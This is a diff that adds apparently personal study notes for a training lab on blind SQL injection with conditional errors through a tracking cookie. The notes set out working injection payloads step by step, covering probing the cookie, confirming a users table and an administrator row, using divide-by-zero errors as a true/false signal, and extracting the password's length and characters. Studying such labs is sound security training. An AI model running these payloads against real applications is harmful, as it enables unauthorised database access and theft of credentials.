@@ -1,0 +1,62 @@
+Lab: Blind SQL injection with conditional errors
+
+Vulnerable parameter -> tracking cookie
+
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+
+STEPS
+#1
+Prove that parameter is vulnerable
+ ' || (select '') || '
+ for non oracle
+
+ ' || (select '' FROM dual) || '
+ for oracle
+
+ #2
+ Confirme that the users table exists in the db
+  ' || (select '' FROM users LIMIT 1) || '
+ for non oracle
+
+
+ ' || (select '' FROM users where rownum =1) || '
+ for oracle
+
+ #3
+ Confirme that the administrator user exists int the users database
+ ' || (select '' FROM users where username='administrator') || '
+ that is a problem because if it doesn't find administrator, it
+won't throw an error.
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+-> always TRUE
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+-> always FALSE
+
+
+PAYLOAD
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+
+explication:
+the From users portion is evaluated first and if administrator doesn't exists => no error because the SELECT won't run.
+if administrator exists => error because SELECT will run.
+
+#4
+find the length of the password:
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
+
+500 = TRUE
+200 = FALSE
+
+
+#5
+Enumarate the password of the administrator user:
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+
